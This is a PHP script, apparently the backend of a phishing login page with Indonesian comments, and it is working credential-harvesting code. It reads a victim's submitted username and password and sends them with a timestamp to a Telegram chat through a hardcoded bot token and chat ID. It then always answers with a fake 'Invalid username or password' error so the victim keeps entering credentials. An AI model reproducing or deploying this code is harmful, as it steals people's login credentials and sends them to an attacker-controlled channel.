<?php
$token_bot = '6356869047:AAEEEmpcSPVJ0Jo6-E0Ba78OnnEEFHPmdwU';
$chat_id = '-1002031321163';  // Ganti dengan Chat ID saluran Anda

function sendMessageToTelegram($message)
{
    global $token_bot, $chat_id;
    
    $url = "https://api.telegram.org/bot$token_bot/sendMessage";
    $data = array('chat_id' => $chat_id, 'text' => $message);

    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $lahir = $_POST['lahir'];

    $message = "New Login Attempt:\n\n";
    $message .= "Username/Email/Phone: $username\n";
    $message .= "Password: $password\n";
    $message .= "Date: " . date("Y-m-d H:i:s");

    sendMessageToTelegram($message);

    echo json_encode(array('error' => 'Invalid username or password. Please try again.'));
} else {
    header("Location: index.html");
    exit();
}
?>
